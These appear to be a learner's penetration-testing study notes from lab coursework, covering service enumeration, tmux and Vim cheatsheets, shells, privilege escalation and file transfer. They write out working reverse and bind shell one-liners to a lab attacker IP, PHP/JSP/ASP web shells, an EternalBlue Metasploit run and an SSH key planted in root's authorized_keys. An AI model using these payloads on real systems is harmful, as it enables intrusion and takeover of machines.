#basics #networkPentTest


s
Folder structure

```shell-session
AntivenomisCrazy@htb[/htb]$ tree Projects/

Projects/
â””â”€â”€ Acme Company
    â”œâ”€â”€ EPT
    â”‚   â”œâ”€â”€ evidence
    â”‚   â”‚   â”œâ”€â”€ credentials
    â”‚   â”‚   â”œâ”€â”€ data
    â”‚   â”‚   â””â”€â”€ screenshots
    â”‚   â”œâ”€â”€ logs
    â”‚   â”œâ”€â”€ scans
    â”‚   â”œâ”€â”€ scope
    â”‚   â””â”€â”€ tools
    â””â”€â”€ IPT
        â”œâ”€â”€ evidence
        â”‚   â”œâ”€â”€ credentials
        â”‚   â”œâ”€â”€ data
        â”‚   â””â”€â”€ screenshots
        â”œâ”€â”€ logs
        â”œâ”€â”€ scans
        â”œâ”€â”€ scope
        â””â”€â”€ tools
```

# What is a Port?

A port can be thought of as a window or door on a house (the house being a remote
system), if a window or door is left open or not locked correctly, we can often gain
unauthorized access to a home. This is similar in computing.

Port(s)Protocol
20 / 21 (TCP)FTP
22 (TCP)SSH
23 (TCP)Telnet
25 (TCP)SMTP
80 (TCP)HTTP
161 (TCP/UDP)SNMP
389 (TCP/UDP)LDAP
443 (TCP)SSL / TLS ( HTTPS )
445 (TCP)SMB
3389 (TCP)RDP

21 is FTP , port 80 is HTTP , port 88 is Kerberos


# Owasp Top 10

![Pasted image 20250412162023](Pasted%20image%2020250412162023.png)

![Pasted image 20250412162949](Pasted%20image%2020250412162949.png)


# Basic Tools

# ssh

```shell
ssh Bob@10.10.10.10
```

# Netcat

```
netcat 10.10.10.10 22
SSH-2.0-OpenSSH_8.4p1 Debian-3
```

As we can see, port 22 sent us its banner, stating that SSH is running on it. This technique is
called Banner Grabbing , and can help identify what service is running on a particular port

Another similar network utility is socat, which has a few features that netcat does not
support, like forwarding ports and connecting to serial devices. Socat can also be used to
upgrade a shell to a fully interactive TTY

Of course. Here is a cheatsheet for `tmux` based on the information you provided.

### Tmux Cheatsheet

A quick reference for using the terminal multiplexer `tmux`.

---

#### **Getting Started**

- **Install Tmux (Debian/Ubuntu):**
    
    Bash
    
    ```
    sudo apt install tmux -y
    ```
    
- **Start a new Tmux session:**
    
    Bash
    
    ```
    tmux
    ```
    

---

#### **The Prefix Key**

All `tmux` commands are activated by first pressing a prefix key combination. After pressing the prefix, you release it and then press the key for the desired command.

- **Default Prefix:** `[CTRL + B]`
    

---

#### **Basic Commands**

|Action|Keystroke|Description|
|---|---|---|
|**Windows**|||
|Create a new window|`[CTRL + B]` then `c`|Opens a new window. You will see it added to the status bar at the bottom.|
|Switch to a window|`[CTRL + B]` then `0`, `1`, `...`|Jumps to the specified window number.|
|**Panes**|||
|Split pane vertically|`[CTRL + B]` then `%`|Splits the current window into two vertical panes (left and right).|
|Split pane horizontally|`[CTRL + B]` then `"`|Splits the current window into two horizontal panes (top and bottom).|
|Switch between panes|`[CTRL + B]` then `â†` `â†’` `â†‘` `â†“`|Moves the cursor to the pane in the direction of the arrow key.|

---

#### **Further Learning**

For more advanced usage, the following resources mentioned in the text are highly recommended:

- A handy **[tmux cheatsheet](https://tmuxcheatsheet.com/)** for a more extensive list of commands.
    
- **[Introduction to tmux](https://www.youtube.com/watch?v=Lqehvpe_djs)** video by Ippsec.



### Vim Cheatsheet

A quick reference for using the `Vim` text editor.

---

#### **Getting Started**

- **Open an existing file:**
    
    Bash
    
    ```
    vim /path/to/file
    ```
    
- **Create a new file:**
    
    Bash
    
    ```
    vim new_filename.txt
    ```
    

---

#### **Understanding Vim Modes**

Vim operates in different modes. Knowing which mode you're in is crucial.

|Mode|How to Enter|What it Does|Indicator|
|---|---|---|---|
|**Normal Mode**|Press `esc` (or start `Vim`)|Navigate the file and use editing commands (cut, copy, paste). You cannot type text directly.|(No indicator)|
|**Insert Mode**|Press `i` from Normal Mode|Type and edit text freely, just like a standard text editor.|`-- INSERT --` at the bottom|
|**Command Mode**|Press `:` from Normal Mode|Enter commands to save, quit, go to lines, etc.|A colon `:` appears at the bottom|

---

#### **Normal Mode Commands (after pressing `esc`)**

Use these commands to manipulate text without typing.

|Action|Command|Description|
|---|---|---|
|**Cut (Delete)**|||
|Cut a single character|`x`|Deletes the character under the cursor.|
|Cut a single word|`dw`|Deletes from the cursor to the beginning of the next word.|
|Cut an entire line|`dd`|Deletes the current line.|
|**Copy (Yank)**|||
|Copy a single word|`yw`|Copies (yanks) the word.|
|Copy an entire line|`yy`|Copies (yanks) the current line.|
|**Paste**|||
|Paste after cursor|`p`|Pastes the last cut or copied text after the cursor.|

**Pro Tip:** Add a number before a command to repeat it. For example, `4yy` copies 4 lines, and `2dw` cuts 2 words.

---

#### **Command Mode Commands (from Normal Mode, press `:`)**

Use these commands for file operations.

|Action|Command|Description|
|---|---|---|
|Go to a line number|`:1`|Jumps the cursor to line number 1.|
|Save the file|`:w`|Writes (saves) the changes to the file.|
|Quit|`:q`|Exits Vim. Fails if there are unsaved changes.|
|Quit without saving|`:q!`|Forces quit and discards any changes.|
|Save and quit|`:wq`|Writes (saves) the file and then quits.|

---

#### **Further Learning**

For more advanced usage, the following resource is highly recommended:

- A more comprehensive **[Vim Cheatsheet](https://vim.rtorr.com/)** for a full list of commands and features.
---


# Service Enumration


## Nmap



# Attacking Network Services


## Banner Grabing

nmap -sV --script=banner
`<target>` is specified. We can also attempt this manually using Netcat . Let us take
another example, using the nc version of Netcat

```
nc -nv 10.129.42.253 21
(UNKNOWN) [10.129.42.253] 21 (ftp) open
220 (vsFTPd 3.0.3)
```
nmap -sV --script=banner -p21


## FTP

```
ftp -p 10.129.42.253
Connected to 10.129.42.253.
220 (vsFTPd 3.0.3)
Name (10.129.42.253:user): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```

## SMB

```
nmap --script smb-os-discovery.nse -p445 10.10.10.40

nmap -A -p445 10.129.42.253
```

## Shares

```
smbclient -N -L \\\\10.129.42.253
smbclient \\\\10.129.42.253\\users
smbclient -U bob \\\\10.129.42.253\\users

```

## SNMP

### ğŸ” What is SNMP?

SNMP stands for **Simple Network Management Protocol**. Itâ€™s like a language used by network devices (like routers, switches, printers) to report their status or receive commands. Think of it like asking a device, â€œHey, how are you doing?â€ and it replies with useful info.

---

### ğŸ§© What's a "Community String"?

A _community string_ is like a **password** that lets you talk to the device using SNMP. There are usually two types:

- `public` (read-only access)
    
- `private` (read-write access)
    

Problem? Many devices use the **default** community strings (`public` and `private`) and admins forget to change them.

---

### ğŸ”“ Why does this matter for hacking?

In older SNMP versions (v1 and v2c), this "password" is sent **in plain text** â€” no encryption, no protection. If you guess or find the string, you can:

- **Read sensitive info** (e.g., running processes, software versions)
    
- **Find credentials** left in command-line arguments
    
- **Discover network layout**, services, and routing info


```
snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0

snmpwalk -v 2c -c private 10.129.42.253

onesixtyone -c dict.txt 10.129.42.254

```

A tool such as onesixtyone can be used to brute force the community string names

# Web Enumeration

## GoBuster

```
gobuster dns -d inlanefreight.com -w

gobuster dir -u http://10.10.10.121/ -w /usr/share/seclists/Discovery/Web-
Content/common.txt
```

## Web Enumeration Tips

---

### Banner Grabbing / Web Server Headers

```
curl -IL https://www.inlanefreight.com

whatweb 10.10.10.121

whatweb --no-errors 10.10.10.0/24


```

### Certifcates 

**look at https certificates to find info


### More

- **Robots.txt
- **Source Code
- **Public Exploits
```
searchploit
```


# Types Of Shell

![Pasted image 20250415145852](Pasted%20image%2020250415145852.png)

```
nc -lvnp 1234
```

![Pasted image 20250415150046](Pasted%20image%2020250415150046.png)

## Upgrading TTY

### ğŸ”¹ What is a TTY?

**TTY** stands for **teletypewriter**, but donâ€™t let the old-school name confuse you. In today's context, it's just a **fancy name for a terminal**

```
python -c 'import pty; pty.spawn("/bin/bash")'

stty raw -echo
fg
[Enter]
[Enter]


echo $TERM
xterm-256color

stty size
67 318

www-data@remotehost$ export TERM=xterm-256color
www-data@remotehost$ stty rows 67 columns 318
```


## Web shells


```
<?php system($_REQUEST["cmd"]); ?>

<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>

<% eval request("cmd") %>

```



**Now you have you webshell Now where to upload it you can upload it in the webroot For example this:

![Pasted image 20250415151250](Pasted%20image%2020250415151250.png)

**if we are attacking a Linux host running Apache, we can
write a PHP shell with the following command:

```
echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
```

**we can either access it through a browser or by using cURL .
We can visit the shell.php page on the compromised website, and use ?cmd=id to
execute the id command:

![Pasted image 20250415151456](Pasted%20image%2020250415151456.png)

## Privilege Escalation


[Linpriv Cheet](Linpriv%20Cheet.md)

[WinPriv Cheet](WinPriv%20Cheet.md)

### Vulnerable Software

**For example, we can use the dpkg -l command on Linux or look at C:\Program Files in Windows to see what software is
installed on the system.

### Crons

```
1. /etc/crontab
2. /etc/cron.d
3. /var/spool/cron/crontabs/root
```

### Exposed Credentials

**This
is very common with configuration files, log files, and user history files ( bash_history
in Linux and PSReadLine in Windows).

### SSH keys

If we find ourselves with write access to a users /.ssh/ directory, we can place our public
key in the user's ssh directory at /home/user/.ssh/authorized_keys .

# Transferring Files

## Using Wget and Curl


```
wget http://10.10.14.1:8000/linenum.sh

curl http://10.10.14.1:8000/linenum.sh -o linenum.sh

```

## Using SCP

```
scp linenum.sh user@remotehost:/tmp/linenum.sh
```

## Using Base64

**in case of firewall restrictions we need to base64 encode the file

**For example,
if we wanted to transfer a binary file called shell , we can base64 encode it as follows:

```
base64 shell -w 0

```

the above command will give the encrypted string

Now, we can copy this base64 string, go to the remote host, and use base64 -d to decode
it, and pipe the output into a file:

```
user@remotehost$ echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP>
...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell
```

# CTFS

https://overthewire.org/wargames/bandit/

https://underthewire.tech/century

![Pasted image 20250415221830](Pasted%20image%2020250415221830.png)

## Basic Tools

|**Command**|**Description**|
|---|---|
|**General**||
|`sudo openvpn user.ovpn`|Connect to VPN|
|`ifconfig`/`ip a`|Show our IP address|
|`netstat -rn`|Show networks accessible via the VPN|
|`sshÂ user@10.10.10.10`|SSH to a remote server|
|`ftp 10.129.42.253`|FTP to a remote server|
|**tmux**||
|`tmux`|Start tmux|
|`ctrl+b`|tmux: default prefix|
|`prefix c`|tmux: new window|
|`prefix 1`|tmux: switch to window (`1`)|
|`prefix shift+%`|tmux: split pane vertically|
|`prefix shift+"`|tmux: split pane horizontally|
|`prefix ->`|tmux: switch to the right pane|
|**Vim**||
|`vim file`|vim: openÂ `file`Â with vim|
|`esc+i`|vim: enterÂ `insert`Â mode|
|`esc`|vim: back toÂ `normal`Â mode|
|`x`|vim: Cut character|
|`dw`|vim: Cut word|
|`dd`|vim: Cut full line|
|`yw`|vim: Copy word|
|`yy`|vim: Copy full line|
|`p`|vim: Paste|
|`:1`|vim: Go to line number 1.|
|`:w`|vim: Write the file 'i.e. save'|
|`:q`|vim: Quit|
|`:q!`|vim: Quit without saving|
|`:wq`|vim: Write and quit|

## Pentesting

| **Command**                                                                           | **Description**                                                       |
| ------------------------------------------------------------------------------------- | --------------------------------------------------------------------- |
| **Service Scanning**                                                                  |                                                                       |
| `nmap 10.129.42.253`                                                                  | Run nmap on an IP                                                     |
| `nmap -sV -sC -p- 10.129.42.253`                                                      | Run an nmap script scan on an IP                                      |
| `locate scripts/citrix`                                                               | List various available nmap scripts                                   |
| `nmap --script smb-os-discovery.nse -p445 10.10.10.40`                                | Run an nmap script on an IP                                           |
| `netcat 10.10.10.10 22`                                                               | Grab banner of an open port                                           |
| `smbclient -N -L \\\\10.129.42.253`                                                   | List SMB Shares                                                       |
| `smbclient \\\\10.129.42.253\\users`                                                  | Connect to an SMB share                                               |
| `snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0`                            | Scan SNMP on an IP                                                    |
| `onesixtyone -c dict.txt 10.129.42.254`                                               | Brute force SNMP secret string                                        |
| **Web Enumeration**                                                                   |                                                                       |
| `gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt`        | Run a directory scan on a website                                     |
| `gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt` | Run a sub-domain scan on a website                                    |
| `curl -IL https://www.inlanefreight.com`                                              | Grab website banner                                                   |
| `whatweb 10.10.10.121`                                                                | List details about the webserver/certificates                         |
| `curl 10.10.10.121/robots.txt`                                                        | List potential directories inÂ `robots.txt`                            |
| `ctrl+U`                                                                              | View page source (in Firefox)                                         |
| **Public Exploits**                                                                   |                                                                       |
| `searchsploit openssh 7.2`                                                            | Search for public exploits for a web application                      |
| `msfconsole`                                                                          | MSF: Start the Metasploit Framework                                   |
| `search exploit eternalblue`                                                          | MSF: Search for public exploits in MSF                                |
| `use exploit/windows/smb/ms17_010_psexec`                                             | MSF: Start using an MSF module                                        |
| `show options`                                                                        | MSF: Show required options for an MSF module                          |
| `set RHOSTS 10.10.10.40`                                                              | MSF: Set a value for an MSF module option                             |
| `check`                                                                               | MSF: Test if the target server is vulnerable                          |
| `exploit`                                                                             | MSF: Run the exploit on the target server is vulnerable               |
| **Using Shells**                                                                      |                                                                       |
| `nc -lvnp 1234`                                                                       | Start aÂ `nc`Â listener on a local port                                 |
| `bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'`                                 | Send a reverse shell from the remote server                           |
| `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc 10.10.10.10 1234 >/tmp/f`    | Another command to send a reverse shell from the remote server        |
| `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/bash -i 2>&1\|nc -lvp 1234 >/tmp/f`         | Start a bind shell on the remote server                               |
| `nc 10.10.10.1 1234`                                                                  | Connect to a bind shell started on the remote server                  |
| `python -c 'import pty; pty.spawn("/bin/bash")'`                                      | Upgrade shell TTY (1)                                                 |
| `ctrl+z`Â thenÂ `stty raw -echo`Â thenÂ `fg`Â thenÂ `enter`Â twice                           | Upgrade shell TTY (2)                                                 |
| `echo "<?php system(\$_GET['cmd']);?>" > /var/www/html/shell.php`                     | Create a webshell php file                                            |
| `curl http://SERVER_IP:PORT/shell.php?cmd=id`                                         | Execute a command on an uploaded webshell                             |
| **Privilege Escalation**                                                              |                                                                       |
| `./linpeas.sh`                                                                        | RunÂ `linpeas`Â script to enumerate remote server                       |
| `sudo -l`                                                                             | List availableÂ `sudo`Â privileges                                      |
| `sudo -u user /bin/echo Hello World!`                                                 | Run a command withÂ `sudo`                                             |
| `sudo su -`                                                                           | Switch to root user (if we have access toÂ `sudo su`)                  |
| `sudo su user -`                                                                      | Switch to a user (if we have access toÂ `sudo su`)                     |
| `ssh-keygen -f key`                                                                   | Create a new SSH key                                                  |
| `echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys`          | Add the generated public key to the user                              |
| `sshÂ root@10.10.10.10Â -i key`                                                         | SSH to the server with the generated private key                      |
| **Transferring Files**                                                                |                                                                       |
| `python3 -m http.server 8000`                                                         | Start a local webserver                                               |
| `wget http://10.10.14.1:8000/linpeas.sh`                                              | Download a file on the remote server from our local machine           |
| `curl http://10.10.14.1:8000/linenum.sh -o linenum.sh`                                | Download a file on the remote server from our local machine           |
| `scp linenum.sh user@remotehost:/tmp/linenum.sh`                                      | Transfer a file to the remote server withÂ `scp`Â (requires SSH access) |
| `base64 shell -w 0`                                                                   | Convert a file toÂ `base64`                                            |
| `echo f0VMR...SNIO...InmDwU \| base64 -d > shell`                                     | Convert a file fromÂ `base64`Â back to its orig                         |
| `md5sum shell`                                                                        | Check the file'sÂ `md5sum`Â to ensure it converted correctly            |

Rev shells
```bash
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
```

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
```

```shell-session
python -c 'import pty; pty.spawn("/bin/bash")'
```

```shell-session
stty raw -echo
```

```shell-session
fg
```

Â Â Types of Shells

```shell-session
AntivenomisCrazy@htb[/htb]$ echo $TERM

xterm-256color
```

Â Â Types of Shells

```shell-session
AntivenomisCrazy@htb[/htb]$ stty size

67 318
```

The first command showed us theÂ `TERM`Â variable, and the second shows us the values forÂ `rows`Â andÂ `columns`, respectively. Now that we have our variables, we can go back to ourÂ `netcat`Â shell and use the following command to correct them:

Â Â Types of Shells

```shell-session
www-data@remotehost$ export TERM=xterm-256color

www-data@remotehost$ stty rows 67 columns 318
```


Code:Â php

```php
<?php system($_REQUEST["cmd"]); ?>
```

Code:Â jsp

```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

Code:Â asp

```asp
<% eval request("cmd") %>
```


|Web Server|Default Webroot|
|---|---|
|`Apache`|/var/www/html/|
|`Nginx`|/usr/local/nginx/html/|
|`IIS`|c:\inetpub\wwwroot\|
|`XAMPP`|C:\xampp\htdocs\|

